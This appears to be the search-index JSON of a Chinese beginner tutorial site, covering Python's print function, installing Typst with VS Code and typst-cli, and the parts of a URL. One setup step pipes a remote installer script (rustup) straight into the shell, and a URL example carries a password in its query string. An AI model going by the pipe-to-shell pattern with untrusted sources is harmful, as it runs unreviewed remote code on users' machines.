<p>\u9996\u5148\uff0c\u524d\u9762\u662f\u82f1\u6587\uff0c\u540e\u9762\u662f\u62ec\u53f7\uff0c\u4f60\u60f3\u5230\u4e86\u4ec0\u4e48\uff1f\u51fd\u6570\u3002\u5728\u9ad8\u4e2d\uff0c\u4f60\u89c1\u8fc7\u7684\u51fd\u6570\u662f <code>f(x)</code> <code>g(x)</code> \u5bf9\u5427\uff0c\u4f46\u662f</p> <ul> <li>\u51fd\u6570\u591a\u4e86\uff0c\u4e00\u4e2a\u5b57\u6bcd\u4f5c\u4e3a\u51fd\u6570\u540d\u5c31\u4e0d\u591f\u7528\u4e86\uff0c\u4e5f\u4e0d\u5177\u6709 \u53ef\u8bfb\u6027 \u3002\u6240\u4ee5\u6211\u4eec\u5f80\u5f80\u628a\u82f1\u6587\u5355\u8bcd\u4f5c\u4e3a\u51fd\u6570\u540d\uff1b\u5f53\u7136\u4e0d\u6b62\u4e8e\u6b64\uff0c\u5177\u4f53\u9700\u8981\u81ea\u884c\u4e86\u89e3\u3002</li> <li>\u5176\u4e2d\u7684 <code>x</code> \u662f\u53c2\u6570\uff0c\u79f0\u4e3a  \u53c2\u6570 \uff1b\u51fd\u6570\u7684\u53c2\u6570\u4e0d\u53ea\u6709\u4e00\u4e2a\uff0c\u8fd9\u70b9\u5728\u5fae\u79ef\u5206/\u9ad8\u7b49\u6570\u5b66/\u79bb\u6563\u6570\u5b66\u7b49\u4e2d\u90fd\u4f1a\u6d89\u53ca\uff0c\u5177\u4f53\u81ea\u884c\u4e86\u89e3\u3002</li> </ul> <p>\u8fd9\u53e5\u8bdd\u7684\u610f\u601d\u5f88\u7b80\u5355\uff0c\u8c03\u7528 <code>print</code> \u51fd\u6570\u2014\u2014\u6253\u5370\uff0c<code>1</code> \u5c31\u662f\u6253\u5370\u7684\u5185\u5bb9\u3002</p> <p>\u4ec0\u4e48\u662f\u8c03\u7528\u51fd\u6570\uff1f</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6211\u95ee\u4f60 \\(\\sin \\frac{\\pi}{2}\\) \u7b49\u4e8e\u591a\u5c11\uff1f\u4f60\u5728\u56de\u7b54\u4e4b\u524d\u5c31\u5728\u8111\u4e2d\u8c03\u7528\u4e86 sin \u8fd9\u4e2a\u51fd\u6570\uff0c\u6839\u636e\u6211\u7684\u8f93\u5165\uff0c\u4f60\u7ed9\u51fa\u4e86\u8f93\u51fa\uff0c\u8fd9\u5c31\u662f\u8c03\u7528\u4e86\u51fd\u6570\u3002</p> <p>\u5bf9\u4e8e\u521d\u5b66\u7f16\u7a0b\uff0c\u9700\u8981\u660e\u767d\u4e00\u4e2a\u9053\u7406\uff1a\u7ed9\u4e86\u4ec0\u4e48\u8f93\u5165\uff0c\u5e94\u8be5\u6709\u600e\u6837\u7684\u8f93\u51fa\uff1b\u5bf9\u4e8e\u51fd\u6570\u672c\u8eab\u662f\u600e\u4e48\u505a\u5230\u8fd9\u6837\u7684\uff1f\u7ba1\u4ed6\u5462\uff01 \u5b66\u7740\u5b66\u7740\u6211\u4eec\u5c31\u4f1a\u77e5\u9053\u81ea\u5df1\u8be5\u7ba1\u7684\u5730\u65b9\u5728\u54ea\uff1b\u5b9e\u9645\u4e0a <code>print</code> \u51fd\u6570\u6d89\u53ca\u5230\u7684\u5730\u65b9\u592a\u5e95\u5c42\u4e86\uff0c\u5f88\u96be\u53bb\u5199\u3002</p> <p>\u6765\u770b\u53f3\u4fa7\u53f3\u4fa7\u662f vscode \u5185\u7f6e\u7684 \u7ec8\u7aef \uff0c\u662f\u5b9e\u9645 \u6267\u884c\u7a0b\u5e8f \u7684\u547d\u4ee4\u53d1\u51fa\u70b9\uff1b\u5728\u547d\u4ee4\u6267\u884c\u540e\uff0c\u6267\u884c\u7ed3\u679c\u4e3a\u201c\u8f93\u51fa <code>1</code> \u201d\u3002\u6ce8\u610f\uff0c\u8f93\u51fa\u7684\u201c\u5185\u5bb9\u201d\u4e0d\u662f\u6267\u884c\u7ed3\u679c\uff0c\u201c\u8f93\u51fa\u5185\u5bb9\u201d \u624d\u662f\u6267\u884c\u7ed3\u679c\u3002</p> <p>Extra</p> <ul> <li>\u5bf9\u4e8e <code>[main]</code> \uff0c\u8fd9\u662f zsh \u7684 git \u5de5\u5177\uff0c\u6682\u4e14\u4e0d\u5fc5\u7406\u4f1a\u3002</li> <li>\u5bf9\u4e8e <code>[~/code]</code>\uff0c\u8fd9\u662f  WSL \u8fd9\u4e00  Linux \u7cfb\u7edf \u7684  \u6587\u4ef6\u8def\u5f84\u3002</li> <li>\u5176\u5b9e\u5728 Windows \u7cfb\u7edf\u4e2d\u7684\u8d44\u6e90\u7ba1\u7406\u5668\u4e5f\u662f\u6709\u6587\u4ef6\u8def\u5f84\u7684</li> <li>\u4f46\u662f\u56e0\u4e3a\u5177\u6709  \u56fe\u5f62\u5316\u754c\u9762 \uff0c\u6211\u4eec\u4f7f\u7528\u9f20\u6807\u5c31\u80fd\u591f\u5b8c\u6210\u8fd9\u4e9b\u4efb\u52a1\uff0c\u6240\u4ee5\u5e73\u65f6\u6ce8\u610f\u7684\u6bd4\u8f83\u5c11\u7f62\u4e86</li> <li> <p>\u770b\u540e\u9762\uff0c\u6211\u4eec\u8f93\u5165\u547d\u4ee4 <code>python3 test.py</code> \uff0c\u8fd9\u91cc\u6211\u4eec\u6267\u884c\u4e86\u4e00\u6761\u57fa\u672c\u7684 linux \u547d\u4ee4\uff0c<code>python3</code> \u53ef\u4ee5\u770b\u4f5c\u6211\u4eec\u8c03\u7528\u4e86 python3 \u8fd9\u4e2a\u51fd\u6570\uff0c\u5176\u5b9e\u662f\u4f7f\u7528\u4e86\u6211\u4eec\u63d0\u4f9b\u7684 python compiler \uff08python \u7f16\u8bd1\u5668\uff09\uff1b<code>test.py</code> \u662f\u8fd9\u4e2a\u6587\u4ef6\u7684\u540d\u5b57\uff0c\u5b83\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u3002</p> </li> <li> <p>\u90a3\u4e48\u7ec8\u7aef\u4e2d\u547d\u4ee4\u7684\u8bed\u53e5\u5c31\u662f\u8ba9\u7f16\u8bd1\u5668\u53bb\u5c06\u6211\u4eec\u5199\u7684\u6587\u672c\u4ee3\u7801\u7f16\u8bd1\u6210\u673a\u5668\u80fd\u591f\u770b\u61c2\u7684\u4e8c\u8fdb\u5236\u8bed\u8a00\uff0c\u6700\u540e\u8ba9\u7535\u8111\u5728\u7ec8\u7aef\u6253\u5370\u51fa\u6211\u4eec\u60f3\u770b\u5230\u7684\u5185\u5bb9\u3002</p> </li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/","title":"Typst begin","text":"Summary <p>Typst \u662f\u4e00\u6b3e\u8f7b\u91cf\u7ea7\u7684\u6807\u8bb0\u8bed\u8a00\u6392\u7248\u7cfb\u7edf\uff0c\u53ef\u4ee5\u7528\u6765\u66ff\u4ee3 LaTeX \u6216 Word \u7b49\u5de5\u5177\u3002</p> <ul> <li>\u57fa\u672c\u4f7f\u7528\uff1a Typst \u63d0\u4f9b\u4e86\u5728\u7ebf\u7f16\u8f91\u5668\u548c\u672c\u5730\u7f16\u8f91\u5668\uff0c\u652f\u6301\u5b9e\u65f6\u6e32\u67d3\u548c\u6a21\u677f\u4f7f\u7528\u3002</li> <li>\u73af\u5883\u914d\u7f6e\uff1a \u5728 VScode + Ubuntu \u73af\u5883\u4e0b\uff0c\u5b8c\u6210\u5b89\u88c5 Typst \u63d2\u4ef6\u548c typst-cli \u5de5\u5177\uff0c\u5e76\u8fdb\u884c\u6a21\u677f\u5bfc\u5165\u3002</li> <li>\u53c2\u8003\u6587\u6863\uff1a \u6587\u7ae0\u63d0\u4f9b\u4e86 Typst \u5b98\u65b9\u6587\u6863\u3001\u6559\u7a0b\u548c\u76f8\u5173\u8d44\u6e90\u7684\u94fe\u63a5\u3002</li> </ul> <p>\u672c\u6587\u5c06\u5206\u4e3a \u4f7f\u7528\u5b66\u4e60 \u4e0e \u73af\u5883\u914d\u7f6e \u4e24\u4e2a\u90e8\u5206\u3002 </p>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#_1","title":"\u4f7f\u7528\u5b66\u4e60","text":"","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#_2","title":"\u57fa\u672c\u4ecb\u7ecd","text":"<p>Introduction</p> <p>Typst \u662f\u4e3a\u79d1\u5b66\u5199\u4f5c\u800c\u8bde\u751f\u7684\u57fa\u4e8e\u6807\u8bb0\u7684\u6392\u7248\u7cfb\u7edf\u3002\u5b83\u88ab\u8bbe\u8ba1\u4e4b\u521d\u5c31\u662f\u4f5c\u4e3a\u4e00\u79cd\u66ff\u4ee3\u54c1\uff0c\u7528\u4e8e\u66ff\u4ee3\u50cf LaTeX \u8fd9\u6837\u7684\u9ad8\u7ea7\u5de5\u5177\uff0c\u53c8\u6216\u8005\u662f\u50cf Word \u548c Google Docs \u8fd9\u6837\u7684\u7b80\u5355\u5de5\u5177\u3002\u6211\u4eec\u5bf9 Typst \u7684\u76ee\u6807\u662f\u6784\u5efa\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u6392\u7248\u5de5\u5177\uff0c\u5e76\u4e14\u8ba9\u7528\u6237\u53ef\u4ee5\u6109\u5feb\u5730\u4f7f\u7528\u5b83\u3002</p> <p>\u76f8\u6bd4\u4e8e LaTeX\uff0ctypst \u6700\u5927\u7684\u7279\u70b9\u5c31\u662f\u8f7b\u91cf\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u4e86 typst \u652f\u6301\u8f83\u4e3a\u9891\u7e41\u5730\u5b9e\u65f6\u6e32\u67d3\u3002</p> <p>\u8fd9\u662f\u6211\u521a\u63a5\u89e6 typst \u4f7f\u7528\u5176\u5199\u7684\u4e00\u4e2a\u7b80\u5355\u4ecb\u7ecd pdf\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u4e86\u89e3\u5230\u66f4\u591a typst \u7684\u7279\u70b9</p>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#_3","title":"\u57fa\u672c\u4f7f\u7528","text":"<p>\u5b66\u4e60\u4e00\u4e2a\u4e1c\u897f\u6700\u597d\u7684\u529e\u6cd5\u5c31\u662f\u9605\u8bfb\u4ed6\u7684\u5b98\u65b9\u6587\u6863\u3002</p> <p>\u5f53\u7136\uff0c\u6709\u65f6\u5019\u5b98\u65b9\u6587\u6863\u4f1a\u8f83\u4e3a\u6666\u6da9\uff1b\u53c8\u6216\u8005\u8fc7\u4e8e\u8be6\u7ec6\uff0c\u800c\u6211\u4eec\u4e0d\u9700\u8981\u77e5\u9053\u90a3\u4e48\u591a\u3002</p> <p>\u5728\u6700\u5f00\u59cb\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 typst \u7684\u5b98\u65b9\u7f51\u7ad9\u76f4\u63a5\u4f7f\u7528\u5b83\uff0c\u4e5f\u5c31\u662f\u4eba\u4eec\u5e38\u8bf4\u7684 \u5f00\u7bb1\u5373\u7528\u3002</p> <p>\u6ce8\u518c\u767b\u5165\uff0c\u770b\u5230\u4e0b\u9762\u7684\u754c\u9762\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u6559\u7a0b\uff0c\u5982\u679c\u60a8\u4e0d\u559c\u82f1\u6587\uff0c\u53ef\u4ee5\u770b\u770b\u5176\u4ed6\u4eba\u505a\u7684\u4e2d\u6587\u6559\u7a0b\u3002</p> <p>\u70b9\u51fb <code>Empty document</code> \uff0c\u8bbe\u7f6e\u4e00\u4e2a\u540d\u5b57\uff08\u8fd9\u91cc\u4f7f\u7528 test \u4f5c\u4e3a\u6d4b\u8bd5\u540d\uff09\uff0c\u521b\u5efa\u540e\u5230\u8fbe\u4e0b\u9762\u7684\u754c\u9762\uff1a</p> <p></p> <p>\u5728\u5de6\u4fa7\u7b80\u5355\u8f93\u5165\u51e0\u4e2a\u5b57\u7b26\u4f5c\u4e3a\u6d4b\u8bd5\uff0c\u5f85\u52a0\u8f7d\u5b8c\u6210\uff08\u221a \u5904\u53ef\u4ee5\u770b\u89c1\u52a0\u8f7d\u7684\u52a8\u56fe\uff09\u540e\u53f3\u4fa7\u5c31\u51fa\u73b0\u4e86\u6587\u5b57\uff1a\u5f88\u7b80\u5355\uff0c\u5de6\u4fa7\u7f16\u8f91\uff0c\u53f3\u4fa7\u770b\u6548\u679c\u3002</p> <p></p> <p>\u5f53\u7136\uff0c\u8fd9\u53ea\u662f\u5199\u6587\u672c\uff0c\u6211\u4eec\u9700\u8981\u5728\u6837\u5f0f\u4e0a\u4f18\u5316\uff0c\u8fd9\u9700\u8981\u8bfb\u8005\u81ea\u884c\u9605\u8bfb\u6559\u7a0b\uff0c\u4e0d\u662f\u6211\u4e09\u8a00\u4e24\u8bed\u8bb2\u7684\u5b8c\u7684\u3002</p> <p>\u5b8c\u6210\u540e\uff0c\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u4e0b\u8f7d\u56fe\u6807\u5373\u53ef\u4e0b\u8f7d pdf\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#_4","title":"\u6a21\u677f\u4f7f\u7528","text":"<p>\u5f88\u591a\u65f6\u5019\u6211\u4eec\u5e76\u4e0d\u60f3\u8981\u6240\u6709\u7684\u6837\u5f0f\u90fd\u81ea\u5df1\u5199\uff0c\u8fd9\u4e2a\u65f6\u5019 \u6a21\u677f \u5c31\u5f88\u91cd\u8981\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 \u4e3b\u9875\u9762\u5de6\u4e0b\u89d2\u7684\u661f\u7403\u56fe\u6807 typst universe \u7684 templates \u770b\u5230\u8bb8\u591a\u6a21\u677f\u3002\u70b9\u8fdb\u4e00\u4e2a\u4f5c\u4e3a\u793a\u4f8b\uff1a</p> <p></p> <p>\u70b9\u51fb\u56fe\u7247\u6211\u4eec\u53ef\u4ee5\u9884\u89c8\u6837\u5f0f\uff0c\u53f3\u4fa7\u7684 <code>create project in app</code> \u53ef\u4ee5\u5c06\u6a21\u677f\u5bfc\u5165\u5230\u6211\u4eec\u7684\u4e3b\u9875\u9762\u4e2d\uff1a\uff08\u4e0b\u9762\u5728\u53f3\u4fa7\u81ea\u547d\u540d\u540e\u521b\u5efa\u5373\u53ef\uff09</p> <p></p> <p></p> <p>\u70b9\u51fb\u53f3\u4fa7\u9700\u8981\u4fee\u6539\u7684\u90e8\u5206\u5c31\u4f1a\u81ea\u52a8\u5b9a\u4f4d\u5230\u5de6\u4fa7\u5bf9\u5e94\u7684\u7f16\u8f91\u90e8\u5206\uff0c\u7136\u540e\u4fee\u6539\u5373\u53ef\uff1b\u5de6\u4fa7\u56fe\u6807\u7b2c\u4e00\u4e2a\u662f\u6587\u4ef6\u5939\u3002\u6ce8\u610f\uff0c\u5bf9\u4e8e\u56fe\u7247\u7b49\u8003\u8651 \u8def\u5f84 \u7684\u7f16\u8f91\u8fd8\u8bf7\u4ed4\u7ec6\u9605\u8bfb\u6587\u6863\u76f8\u5173\u90e8\u5206\uff0c\u4e86\u89e3 \u8def\u5f84 \u8fd9\u4e00\u6982\u5ff5\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#_5","title":"\u73af\u5883\u914d\u7f6e","text":"<p>\u76f8\u6bd4\u4e8e\u5728\u7ebf\uff0c\u6211\u66f4\u52a0\u559c\u6b22\u5728\u672c\u5730\u73af\u5883\u7f16\u8f91\u3002\u4e0b\u9762\u662f\u5728 VScode + Ubuntu \u4e0a\u7f16\u8f91 typst \u7684\u914d\u7f6e\u8bf4\u660e</p> <p>\u6ce8\uff1a\u6211\u4f7f\u7528\u4e86 wsl:ubuntu 22.04\uff1b\u5173\u4e8e vscode \u5b89\u88c5\u4e0d\u591a\u8bf4\u660e\uff0c\u7f51\u4e0a\u4e00\u5927\u5806\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#vscode","title":"vscode \u914d\u7f6e","text":"<p>\u5b89\u88c5\u4e0b\u9762\u7684\u63d2\u4ef6\uff1a</p> <ul> <li>Typst LSP</li> <li>Typst Preview</li> <li>Typst Companion</li> </ul> <p>\u8fd9\u4e9b\u63d2\u4ef6\u6211\u81ea\u5df1\u81ea\u5b9a\u4e49\u8fc7\u5feb\u6377\u952e\uff0c\u5c31\u4e0d\u8bb2\u89e3\u5982\u4f55\u4f7f\u7528\u4e86\uff0c\u4e00\u641c\u4e00\u5927\u5806\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#typst-cli","title":"typst-cli \u5b89\u88c5","text":"<p>\u5b89\u88c5 typst-cli \u662f\u4e3a\u4e86\u8ba9\u6211\u4eec\u80fd\u591f\u50cf <code>git clone</code> \u4e00\u6837\u80fd\u591f\u62c9\u53d6\u7f16\u8f91\u6750\u6599\u81f3\u672c\u5730\u4f7f\u7528\u3002\u6ce8\u610f\u6211\u4eec\u4e0a\u65b9 <code>\u6a21\u677f\u4f7f\u7528</code>  \u90e8\u5206\u7684\u622a\u56fe\u4e2d\u6709\u8fd9\u4e48\u4e00\u884c <code>typst init @preview/bloated-neurips:0.2.1</code> \uff0c\u8fd9\u5c31\u662f\u5728 typst-cli \u4e2d\u4f7f\u7528\u7684\u3002</p> <pre><code># \u5982\u679c\u6ca1\u6709\u5b89\u88c5\u8fc7curl\u548ccargo\u8fd9\u4e24\u4e2a\u5de5\u5177\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\n# \u5b89\u88c5 Rust \u73af\u5883\u5e76\u6fc0\u6d3b\uff0c\u4e4b\u524d\u5b89\u88c5\u8fc7\u5219\u4e0d\u9700\u8981\u6267\u884c\u4e0b\u9762\u8fd9\u4e24\u884c\ncurl --proto '=https' --tlsv1.2 -sSf [https://sh.rustup.rs](https://sh.rustup.rs/) | sh -s -- -y\nsource $HOME/.cargo/env\n# \u5b89\u88c5 Typst CLI\ncargo install --git [https://github.com/typst/typst.git](https://github.com/typst/typst.git) typst-cli\n# \u952e\u5165\u68c0\u67e5\u662f\u5426\u5b89\u88c5\u6210\u529f\ntypst\n# or\ntypst --version\n</code></pre> <p>\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u95ee\u9898 <code>failed to run custom build command for openssl-sys v0.9.60</code> \u53ef\u4ee5\u5c1d\u8bd5\u4ee5\u4e0b\u51e0\u4e2a\u547d\u4ee4\uff0c\u6765\u81ea StackOverflow\uff1b\u60a8\u53ef\u4ee5\u9010\u4e00\u5c1d\u8bd5\uff0c\u6211\u4e5f\u4e0d\u8bb0\u5f97\u6211\u662f\u5728\u5c1d\u8bd5\u54ea\u4e00\u4e2a\u8fc7\u540e\u6210\u529f\u7684\u4e86\u3002\ud83e\udd72</p> <pre><code>sudo apt install pkg-config\nsudo apt-get install libudev-dev\nsudo apt install libssl-dev\nsudo apt install librust-openssl-sys-dev\nsudo apt install pkg-config\nsudo dnf install perl\nsudo apt-get install build-essential\n</code></pre> <p></p>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#_6","title":"\u6a21\u677f\u5bfc\u5165","text":"<p>\u5728\u547d\u4ee4\u884c(CLI)\u4e2d\u8fdb\u5165\u5230\u5408\u9002\u4f4d\u7f6e\uff0c\u952e\u5165</p> <pre><code>[~/work/typst/template]$ typst init @preview/bloated-neurips:0.2.1\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u5de6\u4fa7\u5df2\u7ecf\u53ef\u4ee5\u51fa\u73b0\u4e86\u6587\u4ef6\u5939\u4e86\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e86\uff0c\u5148\u9884\u89c8\u770b\u770b\uff08\u63d2\u4ef6\u4f7f\u7528\u81ea\u67e5\uff09</p> <p></p> <p>\u5982\u679c\u51fa\u73b0\u7ea2\u8272\u62a5\u9519\u7b49\u60c5\u51b5\uff0c\u5bf9\u4e8e\u6a21\u677f\u800c\u8a00\u5f88\u53ef\u80fd\u5c31\u662f \u8def\u5f84 \u95ee\u9898\uff0c\u65f6\u800c\u9700\u8981\u81ea\u5df1\u4fee\u6539\uff1b\u5bf9\u4e8e\u6211\u4eec\u81ea\u5df1\u5199\u8def\u5f84\uff0c\u76f8\u5bf9\u8def\u5f84\u662f\u6700\u597d\u7684\uff0c\u56e0\u4e3a\u4e0d\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u5c31\u5c06\u6587\u4ef6\u5939\u4fee\u6539\u4e86\u4f4d\u7f6e\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#_7","title":"\u63a8\u8350\u5b8f\u5305","text":"<ul> <li>mitex<ul> <li>\u652f\u6301\u6e32\u67d3 latex \u8bed\u6cd5\u3002</li> <li>tex2typst Web App \u53ef\u4ee5\u5c06 latex \u6570\u5b66\u516c\u5f0f\u8f6c\u4e3a typst \u6570\u5b66\u516c\u5f0f\uff08\u6709\u4e00\u70b9 bug\uff09</li> </ul> </li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Typst_begin/#_8","title":"\u53c2\u8003\u6587\u6863","text":"<ul> <li>https://typst.app/</li> <li>https://typst.app/docs/tutorial/</li> <li>https://typst-doc-cn.github.io/docs/tutorial/</li> <li>https://typst.app/universe/package/bloated-neurips</li> <li>https://github.com/howardlau1999/sysu-thesis-typst</li> <li>https://stackoverflow.com/questions/65553557/why-rust-is-failing-to-build-command-for-openssl-sys-v0-9-60-even-after-local-in</li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Url_begin/","title":"Url begin","text":"<p>\u4e86\u89e3 URL\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a\u968f\u65f6\u968f\u5730\u8bbf\u95ee\u67d0\u4e00\u8d44\u6e90\uff1b\u66f4\u597d\u5730\u83b7\u53d6\u8d44\u6e90\uff1b\u4e0d\u5bb9\u6613\u88ab\u94fe\u63a5\u6b3a\u9a97\u2026\u2026\u5c24\u5176\u662f\u5bf9\u4e8e\u8bed\u4e49URL \u3002</p> <p>\u6587\u7ae0\u63d0\u5230\u7684\u6f14\u793a\u94fe\u63a5\u5747\u53ef\u8bbf\u95ee\uff0c\u6240\u6709\u8005\u5982\u8ba4\u4e3a\u4e0d\u5f53\uff0c\u8bf7\u8054\u7cfb\u5220\u9664\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#_1","title":"\u57fa\u672c\u4ecb\u7ecd","text":"<p>\u4ec0\u4e48\u662f URL\uff1f\u6211\u89c9\u5f97\u8fd9\u79cd\u6982\u5ff5\u6027\u4e1c\u897f\u81ea\u5df1\u641c\uff0c\u95ee GPT\uff0cGLM \u4ec0\u4e48\u7684\u518d\u5408\u9002\u4e0d\u8fc7\u3002</p> <p>\u4e0b\u9762\u662f GLM4 \u7684\u56de\u7b54\uff0c\u8be6\u7ec6\u7ec6\u8282\u8bf7\u5982\u6cd5\u70ae\u5236\u3002</p> <p>URL\uff08Uniform Resource Locator\uff0c\u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\uff09\u662f\u4e00\u4e2a\u7528\u4e8e\u5b9a\u4f4d\u4e92\u8054\u7f51\u4e0a\u8d44\u6e90\u7684\u5730\u5740\u3002\u5b83\u662fWeb\u6d4f\u89c8\u5668\u9700\u8981\u8bbf\u95ee\u7f51\u7ad9\u6216\u6587\u4ef6\u65f6\u4f7f\u7528\u7684\u5730\u5740\u3002URL\u53ef\u4ee5\u6307\u5411\u7f51\u9875\u3001\u56fe\u7247\u3001\u89c6\u9891\u3001\u6587\u6863\u7b49\u5404\u79cd\u7c7b\u578b\u7684\u8d44\u6e90\u3002</p> <p>\u4e00\u4e2a\u5178\u578b\u7684URL\u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>\u534f\u8bae\uff1a\u5b9a\u4e49\u4e86\u5ba2\u6237\u7aef\u5e94\u8be5\u4f7f\u7528\u54ea\u79cd\u534f\u8bae\u6765\u8bbf\u95ee\u8d44\u6e90\uff0c\u5982HTTP\uff08Hypertext Transfer Protocol\uff0c\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\uff09\u3001HTTPS\uff08HTTP Secure\uff0c\u5b89\u5168\u7684\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\uff09\u3001FTP\uff08File Transfer Protocol\uff0c\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09\u7b49\u3002</li> <li>\u57df\u540d\uff1a\u6807\u8bc6\u4e86\u8d44\u6e90\u6240\u5728\u7684\u7f51\u7ad9\u6216\u670d\u52a1\u5668\uff0c\u4f8b\u5982\u00a0<code>www.example.com</code>\u3002</li> <li>\u8def\u5f84\uff1a\u6307\u660e\u4e86\u8d44\u6e90\u5728\u670d\u52a1\u5668\u4e0a\u7684\u5177\u4f53\u4f4d\u7f6e\uff0c\u4f8b\u5982\u00a0<code>/pages/home.html</code>\u3002</li> <li>\u67e5\u8be2\u53c2\u6570\uff1a\u63d0\u4f9b\u4e86\u989d\u5916\u7684\u4fe1\u606f\uff0c\u901a\u5e38\u7528\u4e8e\u6570\u636e\u5e93\u67e5\u8be2\u6216\u5bf9\u7f51\u9875\u5185\u5bb9\u7684\u52a8\u6001\u8bf7\u6c42\uff0c\u4f8b\u5982\u00a0<code>?user=name&amp;pass=password</code>\u3002</li> <li>\u7247\u6bb5\u6807\u8bc6\u7b26\uff1a\u7528\u4e8e\u76f4\u63a5\u5b9a\u4f4d\u7f51\u9875\u4e2d\u7684\u67d0\u4e2a\u4f4d\u7f6e\uff0c\u901a\u5e38\u7528\u4e8e\u951a\u70b9\u94fe\u63a5\uff0c\u4f8b\u5982\u00a0<code>#section2</code>\u3002</li> </ul> <p>\u4f8b\u5982\uff0c\u4e00\u4e2a\u5b8c\u6574\u7684URL\u53ef\u80fd\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a</p> <pre><code>https://www.example.com/pages/home.html?user=name&amp;pass=password#section2\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff1a</p> <ul> <li><code>https</code>\u00a0\u662f\u534f\u8bae\uff0c\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u5b89\u5168\u7684\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\u3002</li> <li><code>www.example.com</code>\u00a0\u662f\u57df\u540d\uff0c\u6307\u5411\u7279\u5b9a\u670d\u52a1\u5668\u3002</li> <li><code>/pages/home.html</code>\u00a0\u662f\u8def\u5f84\uff0c\u6307\u5411\u670d\u52a1\u5668\u4e0a\u7279\u5b9a\u6587\u4ef6\u3002</li> <li><code>?user=name&amp;pass=password</code>\u00a0\u662f\u67e5\u8be2\u53c2\u6570\uff0c\u53ef\u80fd\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li><code>#section2</code>\u00a0\u662f\u7247\u6bb5\u6807\u8bc6\u7b26\uff0c\u7528\u4e8e\u76f4\u63a5\u8df3\u8f6c\u5230\u7f51\u9875\u5185\u7684\u7279\u5b9a\u90e8\u5206\u3002</li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#_2","title":"\u6709\u4ec0\u4e48\u7528\uff1f","text":"<p>\u4e0b\u9762\u4e3e\u51e0\u4e2a\u57fa\u672c\u4f8b\u5b50</p>","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#_3","title":"\u968f\u65f6\u968f\u5730\u8bbf\u95ee\u8d44\u6e90","text":"<p>\u5728\u522b\u4eba\u7684\u7535\u8111\u4e0a\uff0c\u6211\u60f3\u8981\u770b\u6211\u81ea\u5df1\u535a\u5ba2\u4e0a\u7684\u4e00\u4e9b\u8d44\u6e90\u600e\u4e48\u529e\uff1f</p> <p>\u522b\u4eba\u7535\u8111\u4e0a\u80af\u5b9a\u4e0d\u4f1a\u5b58\u8bbf\u95ee\u6211\u535a\u5ba2\u7684\u94fe\u63a5\uff0c\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u4e5f\u4e0d\u89c1\u5f97\u641c\u5f97\u5230\u3002</p> <p>\u4f46\u662f\u5176\u5b9e\u77ed\u94fe\u63a5\u662f\u5f88\u597d\u8bb0\u4f4f\u7684\uff1a</p> <pre><code>https://darstib.github.io/blog/\n</code></pre> <p>\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u8865\u5145\u4e2a\u5f00\u5934\u7684\u534f\u8bae\uff0c\u4e00\u4e2a\u57df\u540d darstib.github.io\uff0c\u8bbf\u95ee\u5176\u4e2d\u7684 blog\uff0c\u4e5f\u5f88\u5feb\u7684\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#_4","title":"\u66f4\u597d\u5730\u83b7\u53d6\u8d44\u6e90","text":"","tags":["begin"]},{"location":"tutorial/begin/Url_begin/#_5","title":"\u57df\u540d","text":"<p>\u5047\u8bbe\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a\u7f51\u9875\uff0c\u4ed6\u5c55\u793a\u7684\u529f\u80fd\u5f88\u5f3a\u5927\uff08\u4e0b\u9762\u662f\u4e00\u4e2a\u8ba1\u7b97\u884c\u5217\u5f0f\u7279\u5f81\u503c\u548c\u7279\u5f81\u5411\u91cf\u7684\u4e00\u4e2a\u6f14\u793a\uff09\uff1a</p> <pre><code>https://www.wolframalpha.com/input?i=eigenvalues+%7B%7B0%2C2%2C1%7D%2C%7B-2%2C0%2C3%7D%2C%7B-1%2C-3%2C0%7D%7D\n</code></pre> <p></p> 